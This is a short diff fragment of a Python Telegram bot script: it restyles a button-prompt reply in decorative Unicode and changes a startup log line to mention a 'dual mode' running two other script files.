-    bot.reply_to(message, "❌ Use buttons below 👇", reply_markup=main_menu())
+    bot.reply_to(message, "❌ 𝑼𝒔𝒆 𝒃𝒖𝒕𝒕𝒐𝒏𝒔 𝒃𝒆𝒍𝒐𝒘 👇", reply_markup=main_menu())
 
 # ============================================================
 # 🚀 START BOT
 # ============================================================
 print("✅ Bot is running on Railway...")
 print("📌 Bot Username: @" + bot.get_me().username)
-print("⚡ Fast mode active (5 threads)")
+print("⚡ Dual mode: 67🙂‍↔️❤️‍🔥.py + segs.py")
 
 try:
     bot.infinity_polling()
